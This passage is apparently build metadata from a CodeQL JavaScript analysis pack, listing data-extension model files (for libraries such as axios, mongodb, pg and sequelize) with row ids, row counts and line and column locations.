      relativePath: ext/apollo-server.model.yml
      index: 1
      firstRowId: 1
      rowCount: 4
      locations:
        lineNumbers: A=12+1*3
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: ext/aws-sdk.model.yml
      index: 0
      firstRowId: 5
      rowCount: 3
      locations:
        lineNumbers: A=6+1*2
        columnNumbers: A=7*3
     -
      pack: codeql/javascript-all#1
      relativePath: ext/axios.model.yml
      index: 0
      firstRowId: 8
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/axios.model.yml
      index: 1
      firstRowId: 9
      rowCount: 1
      locations:
        lineNumbers: A=12
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/default-threat-models-fixup.model.yml
      index: 0
      firstRowId: 10
      rowCount: 1
      locations:
        lineNumbers: A=8
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 0
      firstRowId: 11
      rowCount: 4
      locations:
        lineNumbers: A=6+1*3
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 1
      firstRowId: 15
      rowCount: 2
      locations:
        lineNumbers: A=15+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 2
      firstRowId: 17
      rowCount: 6
      locations:
        lineNumbers: A=22+1*5
        columnNumbers: A=9*6
     -
      pack: codeql/javascript-all#1
      relativePath: ext/make-dir.model.yml
      index: 0
      firstRowId: 23
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/markdown-table.model.yml
      index: 0
      firstRowId: 24
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/mkdirp.model.yml
      index: 0
      firstRowId: 25
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/open.model.yml
      index: 0
      firstRowId: 27
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/react-relay-threat.model.yml
      index: 0
      firstRowId: 29
      rowCount: 10
      locations:
        lineNumbers: A=6+1*9
        columnNumbers: A=9*10
     -
      pack: codeql/javascript-all#1
      relativePath: ext/react.model.yml
      index: 0
      firstRowId: 39
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/rimraf.model.yml
      index: 0
      firstRowId: 40
      rowCount: 3
      locations:
        lineNumbers: A=6+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: ext/shelljs.model.yml
      index: 0
      firstRowId: 43
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/tanstack.model.yml
      index: 0
      firstRowId: 44
      rowCount: 6
      locations:
        lineNumbers: A=6+1*5
        columnNumbers: A=9*6
     -
      pack: codeql/javascript-all#1
      relativePath: ext/underscore.string.model.yml
      index: 0
      firstRowId: 50
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: ext/underscore.string.model.yml
      index: 1
      firstRowId: 55
      rowCount: 20
      locations:
        lineNumbers: A=16+1*19
        columnNumbers: A=9*20
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/NoSQL.model.yml
      index: 0
      firstRowId: 75
      rowCount: 4
      locations:
        lineNumbers: A=8+3+1*2
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/NodeJSLib.model.yml
      index: 0
      firstRowId: 79
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/SQL.model.yml
      index: 0
      firstRowId: 84
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/SQL.model.yml
      index: 1
      firstRowId: 89
      rowCount: 4
      locations:
        lineNumbers: A=16+1*3
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/helmet/Helmet.Required.Setting.model.yml
      index: 0
      firstRowId: 93
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/minimongo/model.yml
      index: 0
      firstRowId: 95
      rowCount: 75
      locations:
        lineNumbers: A=6+1*74
        columnNumbers: A=9*75
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 0
      firstRowId: 170
      rowCount: 26
      locations:
        lineNumbers: A=6+1*25
        columnNumbers: A=9*26
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 1
      firstRowId: 196
      rowCount: 611
      locations:
        lineNumbers: A=37+1*610
        columnNumbers: A=9*611
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 2
      firstRowId: 807
      rowCount: 32
      locations:
        lineNumbers: A=653+1*31
        columnNumbers: A=9*32
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 3
      firstRowId: 839
      rowCount: 102
      locations:
        lineNumbers: A=690+1*101
        columnNumbers: A=9*102
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mssql/model.yml
      index: 0
      firstRowId: 941
      rowCount: 34
      locations:
        lineNumbers: A=6+1*33
        columnNumbers: A=9*34
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mysql/model.yml
      index: 0
      firstRowId: 975
      rowCount: 57
      locations:
        lineNumbers: A=6+1*56
        columnNumbers: A=9*57
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mysql/model.yml
      index: 1
      firstRowId: 1032
      rowCount: 3
      locations:
        lineNumbers: A=68+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 0
      firstRowId: 1035
      rowCount: 65
      locations:
        lineNumbers: A=6+1*64
        columnNumbers: A=9*65
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 1
      firstRowId: 1100
      rowCount: 5
      locations:
        lineNumbers: A=76+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 2
      firstRowId: 1105
      rowCount: 23
      locations:
        lineNumbers: A=86+1*22
        columnNumbers: A=9*23
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 0
      firstRowId: 1128
      rowCount: 7
      locations:
        lineNumbers: A=6+1*6
        columnNumbers: A=9*7
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 1
      firstRowId: 1135
      rowCount: 248
      locations:
        lineNumbers: A=18+1*247
        columnNumbers: A=9*248
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 2
      firstRowId: 1383
      rowCount: 5
      locations:
        lineNumbers: A=271+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 3
      firstRowId: 1388
      rowCount: 2
      locations:
        lineNumbers: A=281+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/spanner/model.yml
      index: 0
      firstRowId: 1390
      rowCount: 174
      locations:
        lineNumbers: A=6+1*173
        columnNumbers: A=9*174
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/spanner/model.yml
      index: 1
      firstRowId: 1564
      rowCount: 5
      locations:
        lineNumbers: A=185+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sqlite3/model.yml
      index: 0
      firstRowId: 1569
      rowCount: 15
      locations:
        lineNumbers: A=6+1*14
        columnNumbers: A=9*15
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sqlite3/model.yml
      index: 1
      firstRowId: 1584
      rowCount: 3
      locations:
        lineNumbers: A=26+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/IntegrityCheckingRequired/integrity_checking_required.model.yml
      index: 0
      firstRowId: 1587
      rowCount: 3
      locations:
        lineNumbers: A=6+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/compromised/compromised_domains.model.yml
      index: 0
      firstRowId: 1590
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/untrusted/untrusted_domains.model.yml
      index: 0
      firstRowId: 1591
      rowCount: 6
      locations:
        lineNumbers: A=7+1+3+1*3
        columnNumbers: A=9*6
     -
      pack: codeql/threat-models#2
      relativePath: ext/supported-threat-models.model.yml
      index: 0
      firstRowId: 1597
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/threat-models#2
      relativePath: ext/threat-model-grouping.model.yml
      index: 0
      firstRowId: 1598
      rowCount: 15
      locations:
        lineNumbers: A=8+3+1+3+1*5+3+1+5+1*3
        columnNumbers: A=9*15
